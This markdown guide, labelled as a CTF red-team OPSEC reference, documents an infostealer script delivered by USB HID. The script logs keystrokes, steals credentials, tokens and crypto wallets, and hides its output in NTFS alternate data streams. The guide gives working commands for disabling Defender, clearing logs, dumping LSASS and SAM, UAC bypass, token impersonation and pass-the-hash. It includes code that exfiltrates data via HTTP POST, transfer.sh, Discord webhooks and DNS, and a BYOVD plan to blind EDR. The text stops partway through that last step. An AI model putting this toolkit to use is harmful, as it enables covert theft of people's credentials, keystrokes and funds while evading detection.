# Red Team OPSEC Tips — CTF Edition

Techniques relevant when the CTF simulates a real-life red team engagement.
Grouped by phase. Implemented items are already in `ctf_hunter.py`; others
are manual steps or separate tools.

---

## Already implemented in ctf_hunter.py

| Technique | Detail |
|---|---|
| **ADS output storage** | All data written as NTFS Alternate Data Streams on a single `thumbs.db` decoy file — invisible to `dir`, Explorer, and most EDR dashboards |
| **Hidden + System file attributes** | `SetFileAttributesW(HIDDEN\|SYSTEM)` on the host file — hidden from normal views |
| **In-memory ZIP** | ADS streams are read into RAM and zipped in a `BytesIO` buffer — no ZIP file ever touches disk |
| **Post-exfil cleanup** | `ADS_HOST.unlink()` removes the host file and all attached streams atomically; PS history truncated; script self-deletes |
| **No external network calls during collection** | All collection is local reads — only one outbound connection at exfil time |
| **Runs as the logged-in user** | BashBunny HID types into the user session, so DPAPI and browser SQLite locks work correctly |
| **Keylogger: Raw Input API (primary)** | Hidden message-only window receives `WM_INPUT` packets — no `SetWindowsHookEx` call at all; identical pattern to game engines |
| **Keylogger: pynput fallback** | `SetWindowsHookEx(WH_KEYBOARD_LL)` — flagged by Defender behavioral analysis; only used if Raw Input init fails |
| **Keylogger: AsyncKeyState poll (last resort)** | Polls key state at 50 Hz; no hook but polling pattern can be flagged |
| **Wi-Fi saved passwords** | `netsh wlan show profile key=clear` — no admin required; output in `:cr` stream |
| **Environment variables** | Full user + system env dump — flags are trivially planted here |
| **Sticky Notes** | `plum.sqlite` (modern) + `StickyNotes.snt` (legacy) — common "note to self" hiding spot |
| **FileZilla** | `recentservers.xml` / `sitemanager.xml` — base64-decoded FTP/SFTP passwords |
| **Git credentials** | `.git-credentials` (plaintext tokens), `.gitconfig` |
| **Docker config** | `~/.docker/config.json` — base64-decoded registry auth tokens |
| **kubectl config** | `~/.kube/config` — cluster bearer tokens and certificates |
| **RDP saved connections** | Registry + `.rdp` files from Desktop/Documents |
| **TeamViewer** | `SecurityPasswordAES` registry key — AES-128-CBC decrypted |
| **Windows DPAPI blobs** | `%APPDATA%\Microsoft\Credentials\` — DPAPI-decrypted inline |
| **MobaXterm** | `MobaXterm.ini` — sessions and stored credentials |
| **Package manager tokens** | `.npmrc`, `.pypirc`, `pip.ini`, `composer/auth.json` |
| **Thunderbird** | Saved email account passwords via NSS (same as Firefox) |
| **Recently opened files** | `shell:recent` — top 50 LNK files pointing to recent flag locations |
| **More wallet extensions** | MetaMask Brave/Firefox, Phantom Edge, Coinbase, Binance, Keplr, OKX, Ledger Live, Trezor, Zcash, Dash |

### ADS quick reference

```
thumbs.db        ← host file (512 null bytes, hidden+system, looks like IE thumbnail cache)
thumbs.db:cr     ← credentials
thumbs.db:bp     ← browser passwords
thumbs.db:bh     ← browser history (text)
thumbs.db:bc     ← browser history (CSV)
thumbs.db:ss     ← sessions & tokens
thumbs.db:wl     ← wallets
thumbs.db:cl     ← clipboard
thumbs.db:kl0403 ← keylogger (one stream per day, MMDD)
```

**What detects ADS:** `dir /r`, `Get-Item thumbs.db -Stream *`, Sysinternals `streams.exe`, forensic tools (Autopsy, FTK).
**What doesn't:** Explorer, standard `dir`, most EDR dashboards, casual manual inspection.

**Read a stream manually (for debugging):**
```powershell
Get-Content "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\thumbs.db" -Stream cr
# Or:
more < "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\thumbs.db:cr"
```

**List all streams on the file:**
```powershell
Get-Item "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\thumbs.db" -Stream *
```

---

## Manual steps to do before/during the CTF

### Disable Windows Defender real-time monitoring (if you have admin)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Undo after you're done:
Set-MpPreference -DisableRealtimeMonitoring $false
```
Defender restores this on reboot, so it's non-persistent but lasts the session.

### Add an exclusion path instead (less noisy than disabling entirely)
```powershell
Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Windows\INetCache"
```

### Clear event logs after a run (requires admin, itself generates a log — use carefully)
```powershell
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

### Clear PowerShell history manually
```powershell
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Clear-History
```

### Timestomp output files (make them look like old system files)
```powershell
$d = "2021-06-15 10:23:10"
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\7F3A2B9C\" | ForEach-Object {
    $_.LastWriteTime   = $d
    $_.CreationTime    = $d
    $_.LastAccessTime  = $d
}
```

---

## Additional collection techniques (separate scripts / manual)

### 1. SAM / SYSTEM / SECURITY hive dump (requires admin or SYSTEM)
The SAM hive contains local NTLM hashes — flags could be hidden here.
```powershell
# Shadow copy method — no tools needed
$s = (Get-WmiObject Win32_ShadowCopy | Select-Object -Last 1).DeviceObject
cmd /c "copy $s\Windows\System32\config\SAM C:\Temp\SAM"
cmd /c "copy $s\Windows\System32\config\SYSTEM C:\Temp\SYSTEM"
# Then crack with secretsdump.py or similar offline
```

### 2. LSASS memory dump (requires admin — flags may be in memory as plaintext creds)
```powershell
# Comsvcs method — LOLBin, no extra tools
$id = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $id C:\Temp\lsass.dmp full
# Exfil lsass.dmp, then parse with pypykatz or mimikatz offline
```

### 3. Credential Manager (CredMan) via cmdkey
```powershell
cmdkey /list
# Flags could be stored as Windows generic credentials
# ctf_hunter.py already reads these via CredEnumerate
```

### 4. DPAPI Masterkey blobs (advanced — if DPAPI-protected flags exist outside browsers)
```powershell
# Blobs live in:
# %APPDATA%\Microsoft\Protect\<SID>\
# Decrypt offline with: dpapick, impacket's dpapi.py, or mimikatz sekurlsa::dpapi
```

### 5. Group Policy Preferences — GPP cpassword (MS14-025)
```powershell
# ctf_hunter.py already handles this. Manual search:
Get-ChildItem -Path "C:\Windows\SYSVOL" -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue
```

### 6. Unattend.xml / Autounattend.xml (Windows setup files with plaintext credentials)
```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\sysprep\Unattend.xml
```
ctf_hunter.py already collects these.

### 7. WinSCP / PuTTY / FileZilla saved sessions
```powershell
# Registry paths (ctf_hunter.py reads these):
# HKCU:\Software\SimonTatham\PuTTY\Sessions\
# HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions\
# FileZilla stores in: %APPDATA%\FileZilla\recentservers.xml
```

### 8. Wireless network passwords
```cmd
netsh wlan show profiles
netsh wlan show profile name="SSID_NAME" key=clear
```
Could hide a flag as a Wi-Fi password.

### 9. Clipboard via PowerShell (if pynput not available)
```powershell
Add-Type -AssemblyName PresentationCore
[Windows.Clipboard]::GetText()
```

### 10. Environment variables (flags sometimes planted here)
```powershell
Get-ChildItem Env: | Sort-Object Name | Format-Table -AutoSize
# Also check: System-level env vars
[System.Environment]::GetEnvironmentVariables("Machine")
```

### 11. Named pipes and mailslots (unusual flag locations)
```powershell
# List named pipes — a flag server might be listening
[System.IO.Directory]::GetFiles("\\.\pipe\") | Sort-Object
```

### 12. Alternate Data Streams (ADS) — hidden data attached to normal files
```powershell
# List ADS on files in common locations
Get-Item C:\Users\*\Desktop\* -Stream * | Where-Object Stream -ne ':$Data'
Get-Item C:\* -Stream * -ErrorAction SilentlyContinue | Where-Object Stream -ne ':$Data'
# Read a specific stream:
Get-Content "C:\Users\user\Desktop\readme.txt:hidden_flag"
```

### 13. Volume Shadow Copies — access "deleted" or overwritten files
```powershell
vssadmin list shadows
# Mount a shadow copy:
cmd /c "mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"
```

### 14. Registry run keys and scheduled tasks (persistence = flag location hint)
```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ScheduledTask | Where-Object State -ne Disabled | Select-Object TaskName, TaskPath
```

### 15. Recently accessed files (MRU lists)
```powershell
# Office recent files, shell recent docs — could point to flag locations
Get-ItemProperty "HKCU:\Software\Microsoft\Office\*\*\File MRU" -ErrorAction SilentlyContinue
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\" | Sort-Object LastWriteTime -Descending
```

---

## Privilege escalation

### Your starting position matters

The BashBunny HID attack runs as the **logged-in user** — same token Windows assigned when
they logged in. There are three distinct situations:

| Situation | What you have | What you need |
|---|---|---|
| Standard user, not in Admins group | Filtered standard token | Full privilege escalation exploit |
| Member of local Admins, UAC on | Filtered medium-integrity token | UAC bypass (no exploit needed) |
| Already admin / UAC off | High-integrity token | Nothing — you're done |

Run this to check: `whoami /groups` — look for `BUILTIN\Administrators` and its `Enabled/Disabled` state.

---

### Path 1 — UAC bypass (already in Admins group, UAC blocking elevation)

No exploit needed. UAC is not a security boundary — Microsoft's own documentation states
that bypassing UAC with an account that is already a local administrator is by design.

**fodhelper.exe** (most reliable — works on all Windows 10 and 11 builds):

```powershell
# fodhelper auto-elevates and reads a HKCU registry key before launching
# Writing to HKCU requires no privileges — any user can do it
$cmd = "powershell -WindowStyle Hidden -Command `"Start-Process cmd -Verb RunAs -ArgumentList '/c python C:\path\to\ctf_hunter.py --admin --exfil http://YOUR_IP:8000'`""
New-Item -Force -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value $cmd | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"
Start-Sleep 3
# Cleanup registry key
Remove-Item -Force -Path "HKCU:\Software\Classes\ms-settings" -Recurse -ErrorAction SilentlyContinue
```

**ctf_hunter.py `--elevate` flag** does this automatically (see script section).

**SilentCleanup scheduled task** (alternative — runs `cleanmgr.exe` as HIGH integrity, path hijackable):

```powershell
# SilentCleanup runs %windir%\system32\cleanmgr.exe but reads PATH first
# Place a malicious cleanmgr.exe earlier in PATH, trigger the task
$env:Path = "C:\Temp;" + $env:Path
Copy-Item "C:\tools\python\python.exe" "C:\Temp\cleanmgr.exe"
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I
```

**Other reliable UAC bypasses:**

| Binary | Method | Windows version |
|---|---|---|
| `fodhelper.exe` | HKCU `ms-settings` registry hijack | Win10/11 all builds |
| `computerdefaults.exe` | HKCU `ms-settings` registry hijack | Win10/11 all builds |
| `sdclt.exe` | `IsolatedCommand` registry key | Win10 |
| `cmstp.exe` | COM object + INF file | Win7–11 |
| `SilentCleanup` task | PATH DLL hijack | Win10/11 |
| `eventvwr.exe` | HKCU `mscfile` registry hijack | Win7–10 (patched on newer) |

Full list: [UACME on GitHub](https://github.com/hfiref0x/UACME) — 70+ bypass techniques catalogued.

---

### Path 2 — Token impersonation (SeImpersonatePrivilege)

If you're running as a **service account, IIS app pool, or SQL Server** (common in CTF server scenarios), you likely have `SeImpersonatePrivilege`. This lets you impersonate any token on the system including SYSTEM.

Check: `whoami /priv` — look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

**GodPotato** (most modern — works on Windows Server 2012–2022, Windows 10/11):

```powershell
# Download GodPotato-NET4.exe to target
.\GodPotato-NET4.exe -cmd "python C:\path\ctf_hunter.py --admin --exfil http://YOUR_IP:8000"
```

**PrintSpoofer** (requires print spooler running — most servers have it):

```powershell
.\PrintSpoofer64.exe -i -c "python ctf_hunter.py --admin --exfil http://YOUR_IP:8000"
```

**RoguePotato / SweetPotato** (alternatives if GodPotato fails):

```powershell
.\RoguePotato.exe -r YOUR_IP -e "python ctf_hunter.py --admin"
```

These tools work by coercing the SYSTEM token to connect to a named pipe you control,
then impersonating it. No kernel exploit required — pure Windows API abuse.

---

### Path 3 — Service misconfigurations (standard user, not in Admins)

If you're a true standard user with no path to impersonation, look for:

**AlwaysInstallElevated** (if both keys are 1, any user can install MSI as SYSTEM):
```powershell
Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
# If both = 1:
msiexec /quiet /qn /i malicious.msi
```

**Weak service binary permissions** (automated with PowerUp or winPEAS):
```powershell
# PowerUp (no install needed — paste the function):
Invoke-AllChecks
# winPEAS (single exe, comprehensive):
.\winPEASx64.exe
```

**Unquoted service paths:**
```powershell
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v """
# If path has spaces and no quotes, Windows tries each prefix as an executable
# e.g. C:\Program Files\My App\service.exe → tries C:\Program.exe first
```

**Pass-the-hash** (if you have an NTLM hash from the SAM or LSASS dump):
```bash
# From your attacker machine — no admin needed on target if hash is valid
impacket-psexec -hashes :NTLM_HASH administrator@TARGET_IP
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
```

---

## LOLBins for manual collection tasks

Living-off-the-Land Binaries — signed Microsoft executables that can be abused.
No tools to transfer, no AV flags on the binary itself.

### LSASS dump (requires admin)

**comsvcs.dll via rundll32** — the cleanest, always present:
```powershell
$id = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $id C:\Windows\Temp\lsa.dmp full
# Parse offline: pypykatz lsa minidump lsa.dmp
```

**createdump.exe** — ships with .NET Framework, very low detection:
```powershell
$id = (Get-Process lsass).Id
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe" -u -f C:\Windows\Temp\lsa.dmp $id
```

**sqldumper.exe** — ships with SQL Server (if installed):
```powershell
$id = (Get-Process lsass).Id
sqldumper.exe $id 0 0x01100
```

**Task Manager** — if you have GUI/RDP access, right-click `lsass.exe` → Create dump file.
Windows saves it to `%USERPROFILE%\AppData\Local\Temp\lsass.DMP` automatically.

**Parsing the dump offline** (on your Linux machine):
```bash
pip install pypykatz
pypykatz lsa minidump lsa.dmp
# Shows: NTLM hashes, plaintext passwords (if WDigest enabled), Kerberos tickets
```

---

### SAM / SYSTEM / SECURITY hive (requires admin)

**reg.exe save** — always present, no tools needed:
```powershell
reg save HKLM\SAM     C:\Windows\Temp\SAM.hiv    /y
reg save HKLM\SYSTEM  C:\Windows\Temp\SYSTEM.hiv  /y
reg save HKLM\SECURITY C:\Windows\Temp\SEC.hiv    /y
# Parse offline:
# secretsdump.py -sam SAM.hiv -system SYSTEM.hiv -security SEC.hiv LOCAL
```

**Volume Shadow Copy** (no admin needed if a VSS snapshot already exists):
```powershell
$s = (Get-WmiObject Win32_ShadowCopy | Select -Last 1).DeviceObject
cmd /c "copy `"$s\Windows\System32\config\SAM`" C:\Windows\Temp\SAM.hiv"
cmd /c "copy `"$s\Windows\System32\config\SYSTEM`" C:\Windows\Temp\SYSTEM.hiv"
```

---

### Volume Shadow Copies — access deleted / overwritten files

**vssadmin** — always present:
```powershell
vssadmin list shadows
# Mount the latest shadow copy as a drive:
cmd /c "mklink /d C:\vss \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"
# Now browse C:\vss\ like a normal drive
dir C:\vss\Users\*\Desktop\
```

**diskshadow.exe** — LOLBin, can create a new shadow copy and mount it:
```
# Create script.dsh:
set context persistent nowriters
add volume c: alias flagdrive
create
expose %flagdrive% z:
exit

diskshadow /s script.dsh
# z:\ is now the shadow copy — browse it
```

---

### Named pipes — enumerating flag servers

No LOLBin needed — pure PowerShell:
```powershell
# List all named pipes
[System.IO.Directory]::GetFiles("\\.\pipe\") | Sort-Object

# Connect to a pipe and read from it (a CTF flag server might write to a pipe)
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "flagpipe", "In")
$pipe.Connect(3000)   # 3 second timeout
$reader = New-Object System.IO.StreamReader($pipe)
$reader.ReadToEnd()
$pipe.Close()
```

---

### ADS scanning — every file in common locations

No tools needed:
```powershell
# Scan all files on Desktop, Documents, C:\ root
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue |
    Get-Item -Stream * -ErrorAction SilentlyContinue |
    Where-Object { $_.Stream -ne ':$Data' -and $_.Stream -ne 'Zone.Identifier' } |
    Select-Object FileName, Stream, Length

# Read a specific stream:
Get-Content "C:\Users\user\Desktop\readme.txt" -Stream hidden_flag
```

---

### Enterprise Wi-Fi (PEAP / EAP-TLS saved credentials)

```powershell
# Export all Wi-Fi profiles to XML (includes saved credentials in some cases)
netsh wlan export profile folder=C:\Windows\Temp key=clear

# The XML files may contain plaintext passwords under <keyMaterial> or
# DPAPI-encrypted blobs under <protected>
Get-Content "C:\Windows\Temp\Wi-Fi-SSID_NAME.xml"
```

For PEAP with "remember my credentials": credentials are stored in the
Windows Credential Manager under `WLAN_MSM_user_cred_*` targets —
ctf_hunter.py's CredEnumerate already picks these up.

---

## What CAN be solved (with the right access)

| Problem | Solution | Requires |
|---|---|---|
| UAC-blocked admin token | UAC bypass (fodhelper, etc.) | Member of local Admins |
| Service account → SYSTEM | Potato family (GodPotato, PrintSpoofer) | SeImpersonatePrivilege |
| SAM NTLM hashes | reg.exe save → secretsdump.py offline | Admin |
| LSASS plaintext creds | comsvcs.dll minidump → pypykatz | Admin |
| LSASS NTLM hashes | Same as above | Admin |
| WDigest plaintext (older OS) | Enable WDigest via registry, wait for re-login, dump LSASS | Admin + time |
| DPAPI secrets outside browser | LSASS dump contains masterkeys → dpapi.py | Admin |
| Kerberos tickets | LSASS dump → pypykatz extracts .kirbi → impacket | Admin |
| Deleted files | Volume Shadow Copy → browse C:\vss\ | VSS must exist |
| Encrypted zip / archive | hashcat with wordlist | Hash of the archive |
| Browser master password (empty) | NSS already handles this in ctf_hunter.py | None |

---

## What CANNOT be solved (hard limits)

| Blocker | Why | Workaround |
|---|---|---|
| **Hardware security key (YubiKey, smart card)** | Private key is non-extractable from hardware | None — must have the physical device |
| **BitLocker with TPM + PIN** | TPM seals the key; disk unreadable without correct PIN | Physical access + TPM sniffing (extremely advanced) |
| **FIDO2 / WebAuthn credentials** | Private key lives in hardware authenticator | None |
| **VeraCrypt / hidden volume** | AES-256 — no backdoor, no key derivation without password | Dictionary attack if weak passphrase |
| **Firefox / Thunderbird master password set** | NSS returns error; ctf_hunter.py reports `[NSS decrypt failed — may have master password]` | Dictionary attack: `hashcat -m 16100` against `key4.db` |
| **Cloud-only secrets (Azure Key Vault, AWS Secrets Manager)** | Secret never written locally — only accessible via authenticated API call | Steal the auth token (already collected), call the API yourself |
| **Windows Hello biometric** | PIN/fingerprint unlocks TPM-bound key; key never leaves TPM | None |
| **EAP-TLS certificate auth (Wi-Fi / VPN)** | Certificate may be on smart card; even if on disk, private key is in DPAPI/TPM | DPAPI decrypt if key is software-stored (needs admin) |
| **In-memory-only secrets never persisted** | If a flag was typed, used, and never saved — it may only be in LSASS or process memory | LSASS dump; process memory scan with `procdump -ma PID` |
| **Properly configured HSM** | Hardware Security Module — keys never exportable | None |

### Special case: Firefox/Thunderbird master password

If set, ctf_hunter.py will report the failure. To attack it offline:
```bash
# Extract the hash from key4.db
python3 firefox_decrypt.py --list   # from lclevy/firepwd
# Or use hashcat mode 16100:
hashcat -m 16100 firefox_hash.txt rockyou.txt
```

### Special case: cloud secrets reachable with stolen tokens

If ctf_hunter.py collected Azure, AWS, or GCloud tokens, the secret may be
one API call away — run from your own machine:
```bash
# AWS — use stolen credentials file
aws configure --profile stolen
aws secretsmanager list-secrets --profile stolen
aws secretsmanager get-secret-value --secret-id FLAG --profile stolen

# Azure — use stolen accessTokens.json
az login --use-device-code   # or restore the token file
az keyvault secret list --vault-name VAULTNAME
az keyvault secret show --vault-name VAULTNAME --name FLAG
```

---

## Network-level collection (when on the CTF network segment)

### Responder — capture NTLMv2 hashes passively
```bash
# Run on your attacker machine on the same subnet
responder -I eth0 -wPv
# Any LLMNR/NBT-NS/mDNS request from a CTF machine will send you NTLMv2
# Crack hashes with hashcat: hashcat -m 5600 hashes.txt rockyou.txt
```

### SMB relay (if SMB signing is off — common in CTF labs)
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

---

## Exfiltration techniques

### Comparison

| Method | Stealth | Requires open port | Works through strict firewall | Speed |
|---|---|---|---|---|
| Direct ZIP POST (current) | Medium | Yes (your server) | No | Fast |
| Chunked POST | Medium | Yes | No | Fast |
| Anonymous upload + URL notify | High | No | Yes (HTTPS to CDN) | Medium |
| Discord / Slack webhook | High | No | Yes (looks like app traffic) | Medium |
| DNS exfiltration | Very high | No (DNS only) | Almost always | Slow |
| ICMP tunnel | Very high | No | Sometimes | Slow |

---

### Method 1 — Direct ZIP POST (already in ctf_hunter.py)

Best for: CTF environments where your server is reachable and no DPI/firewall.

```python
# Already implemented — run with:
python ctf_hunter.py --exfil http://YOUR_IP:8000
```

Receiver reassembles from `X-Host` header and saves to `received/<hostname>_<ts>/`.

---

### Method 2 — Chunked POST (for large payloads or size-limited servers)

Split the ZIP into fixed-size chunks. Each chunk is a separate POST. The receiver
reassembles them in order using the `X-Session`, `X-Chunk`, `X-Total` headers.

**On the target (replace the exfiltrate call):**
```python
import io, zipfile, uuid, urllib.request

CHUNK_SIZE = 512 * 1024  # 512 KB per chunk

def exfil_chunked(url, payload_bytes):
    session = str(uuid.uuid4())[:8]
    chunks  = [payload_bytes[i:i+CHUNK_SIZE]
               for i in range(0, len(payload_bytes), CHUNK_SIZE)]
    for idx, chunk in enumerate(chunks):
        req = urllib.request.Request(
            url, data=chunk,
            headers={
                "Content-Type": "application/octet-stream",
                "X-Session":    session,
                "X-Chunk":      str(idx),
                "X-Total":      str(len(chunks)),
                "X-Host":       os.environ.get("COMPUTERNAME", "unknown"),
            },
            method="POST")
        urllib.request.urlopen(req, timeout=15)
```

**Receiver side — reassemble chunks (add to receive.py):**
```python
sessions = {}   # session_id → {idx: bytes}

def do_POST(self):
    length  = int(self.headers.get("Content-Length", 0))
    data    = self.rfile.read(length)
    session = self.headers.get("X-Session", "x")
    idx     = int(self.headers.get("X-Chunk", 0))
    total   = int(self.headers.get("X-Total", 1))
    host    = self.headers.get("X-Host", "unknown")

    sessions.setdefault(session, {})[idx] = data

    if len(sessions[session]) == total:
        payload = b"".join(sessions.pop(session)[i] for i in range(total))
        # write payload as ZIP, extract as usual
```

---

### Method 3 — transfer.sh upload + URL notification (`--transfer`)

The ZIP is PUT to `transfer.sh` over HTTPS (CDN traffic — looks like a developer uploading a build artifact).
Your server only receives a one-line URL string. Files auto-delete after 3 days.

**CLI usage:**
```
# Upload only — download URL printed to the hidden PowerShell window
python ctf_hunter.py --transfer

# Upload + ping your server with the URL (server needs receive.py running)
python ctf_hunter.py --transfer http://YOUR_SERVER_IP:8000
```

**Retrieving the ZIP after a notified upload:**
```bash
# receive.py saves the notification as raw.bin — read the URL from it:
cat ~/received/<hostname>_<ts>/raw.bin
# → DESKTOP-XYZ_user | 2026-04-03 14:22:01 | https://transfer.sh/AbCd1234/DESKTOP-XYZ_user.zip

wget "https://transfer.sh/AbCd1234/DESKTOP-XYZ_user.zip"
unzip DESKTOP-XYZ_user.zip -d results/
```

**Other anonymous upload services (not implemented in ctf_hunter.py but usable manually):**

| Service | Max size | Retention | API |
|---|---|---|---|
| `transfer.sh` | 10 GB | 3–14 days (set via `Max-Days` header) | `PUT https://transfer.sh/<filename>` |
| `file.io` | 2 GB | Deleted after first download | `POST https://file.io` multipart |
| `0x0.st` | 512 MB | 90 days | `POST https://0x0.st` multipart |
| `pixeldrain.com` | 20 GB | 60 days | `PUT https://pixeldrain.com/api/file/<name>` |

---

### Method 4 — Discord webhook (`--discord`)

ZIP attaches directly to a message in your Discord server. Traffic is HTTPS to `discord.com` — almost never blocked or inspected by firewalls. No account needed on the target machine.

**One-time Discord setup:**
1. Open Discord → your server → any private channel
2. Channel Settings (gear) → Integrations → Webhooks → New Webhook
3. Give it an innocent name (e.g. `build-bot`), click **Copy Webhook URL**
4. URL format: `https://discord.com/api/webhooks/1234567890/AbCdEfGh...`

**CLI usage:**
```
python ctf_hunter.py --discord https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN
```

**Size behaviour:**
- ZIP ≤ 24 MB → attached directly to the Discord message
- ZIP > 24 MB → automatically uploaded to transfer.sh; the download URL is posted as a plain message

**Combining methods for redundancy (recommended):**
```
python ctf_hunter.py --transfer http://YOUR_SERVER_IP:8000 --discord https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN
```
If one method fails (server unreachable, Discord rate-limited), the other still fires.

---

### Method 5 — DNS exfiltration (works through almost any firewall)

Data is encoded as subdomains of a domain you control.
Each DNS query carries ~60 bytes. Slow, but bypasses HTTP/S filtering entirely.
You need: a domain + NS record pointing to your server + `dnslib` or manual socket.

**Concept:**
```
4865_6c6c6f.session42.chunk001.exfil.yourdomain.com  →  "Hello" (hex-encoded)
```

Your authoritative DNS server logs every query — the data arrives as query logs even if nothing responds.

**Minimal sender (no external libraries):**
```python
import socket, base64, hashlib

def dns_exfil(data: bytes, domain: str, dns_server: str):
    """Send data as DNS A-record queries. domain = 'exfil.yourdomain.com'"""
    encoded = base64.b32encode(data).decode().rstrip("=").lower()
    # Split into 50-char labels (DNS label max = 63)
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    session = hashlib.md5(data[:16]).hexdigest()[:8]
    for idx, chunk in enumerate(chunks):
        qname = f"{chunk}.{session}.{idx:04d}.{domain}"
        # Build minimal DNS query packet
        txid   = idx.to_bytes(2, "big")
        flags  = b"\x01\x00"
        counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
        qname_enc = b"".join(
            len(p).to_bytes(1,"big") + p.encode()
            for p in qname.split(".")
        ) + b"\x00"
        qtype  = b"\x00\x01\x00\x01"  # A, IN
        packet = txid + flags + counts + qname_enc + qtype
        sock.sendto(packet, (dns_server, 53))
        time.sleep(0.05)   # throttle to avoid rate limiting
    sock.close()
```

**Receiver — read from your DNS server's query log:**
```bash
# If running bind9 / PowerDNS, enable query logging then:
grep "exfil.yourdomain.com" /var/log/named/queries.log | \
  awk '{print $6}' | cut -d. -f1 | \
  python3 -c "
import sys, base64
data = ''.join(sys.stdin.read().split())
print(base64.b32decode(data.upper() + '=' * (-len(data) % 8)).decode())
"
```

Or use **dnscat2** which wraps all of this in a proper C2 channel with encryption.

---

## AV/EDR evasion quick reference

| Technique | When to use |
|---|---|
| ADS output (thumbs.db streams) | Already in ctf_hunter.py — default |
| Run from USB (no disk write for script) | Always — primary delivery method |
| `-WindowStyle Hidden` PowerShell | Already in payload.txt |
| `-ExecutionPolicy Bypass -NoProfile` | Already in payload.txt |
| `Set-MpPreference -DisableRealtimeMonitoring` | If you have admin and time is short |
| `Add-MpPreference -ExclusionPath` | Targeted exclusion for INetCache path only |
| Avoid `Invoke-Expression` / `IEX` | Flagged by AMSI; use `& $py $script` instead |
| Avoid `DownloadString` / `WebClient` at runtime | Flagged; offline delivery (BashBunny) avoids this |
| Timestomp the ADS host file | `$f.LastWriteTime = "2021-01-01"` after collection |
| Exfil via HTTPS to CDN (transfer.sh) | Upload traffic looks like normal web browsing |
| Exfil via Discord webhook | HTTPS to discord.com — rarely blocked or inspected |
| DNS exfil | Last resort — works through almost any egress filter |
| Clear event logs | Only if you have admin and it's allowed by CTF rules |

---

## Keylogger detection: why and how to work around it

### Why `SetWindowsHookEx(WH_KEYBOARD_LL)` is detected

When a process calls `SetWindowsHookEx`, the Windows kernel synchronously notifies
every registered `PsSetCreateProcessNotifyRoutine` and image-load callback — these are
the hooks that AV/EDR registers at boot. The AV kernel driver sees the hook registration
*before your code returns from the call*, regardless of how the calling code is obfuscated.
XOR-encrypting the source, running from `exec(bytes(...))`, or using `ctypes` directly
instead of pynput all make no difference — the syscall is the trigger.

### ctf_hunter.py keylogger priority order

1. **Raw Input API** (primary, lowest detection)
   Creates a hidden message-only window (`HWND_MESSAGE`) and registers it for `WM_INPUT`
   with `RegisterRawInputDevices`. No `SetWindowsHookEx` — the kernel delivers raw HID
   packets directly to the window's message queue. This is exactly how DirectInput,
   game engines, and remote desktop clients read keyboard input. AV products whitelist
   this pattern because flagging it would break every game on the platform.

2. **pynput / SetWindowsHookEx** (fallback, high detection risk)
   Used only if Raw Input window creation fails. Defender behavioral analysis flags this
   almost immediately on default configurations.

3. **GetAsyncKeyState polling** (last resort, medium detection)
   Polls all VK codes at 50 Hz. No hook. The `GetAsyncKeyState` call itself appears in
   `triage.py`'s suspicious API list — some behavioural AVs watch for rapid polling loops.

### Nuclear option: BYOVD (Bring Your Own Vulnerable Driver)

Requires admin. Load a legitimate, WHQL-signed driver that has an exploitable IOCTL
interface → use it to overwrite kernel memory → patch the
`PsSetCreateProcessNotifyRoutine` callback array to remove AV/EDR entries →
`SetWindowsHookEx` is then completely invisible.

Well-documented vulnerable drivers (all publicly known, used by multiple APT groups):

| Driver | Signed by | Exploit type |
|---|---|---|
| `RTCore64.sys` | MSI (Afterburner) | Arbitrary kernel R/W via IOCTL |
| `DBUtil_2_3.sys` | Dell | Arbitrary kernel R/W |
| `gdrv.sys` | Gigabyte | Arbitrary kernel R/W |
| `AsrDrv106.sys` | ASRock | Arbitrary kernel R/W |
| `procexp.sys` | Microsoft (Sysinternals) | Terminate protected AV processes |

**Practical CTF use (if you have admin):**
```powershell
# 1. Copy the driver to a temp location
copy RTCore64.sys C:\Windows\Temp\gpu_perf.sys

# 2. Load it (requires admin — sc or NtLoadDriver)
sc create perfmon type= kernel binPath= C:\Windows\Temp\gpu_perf.sys
sc start perfmon

# 3. Use the IOCTL interface to patch AV kernel callbacks
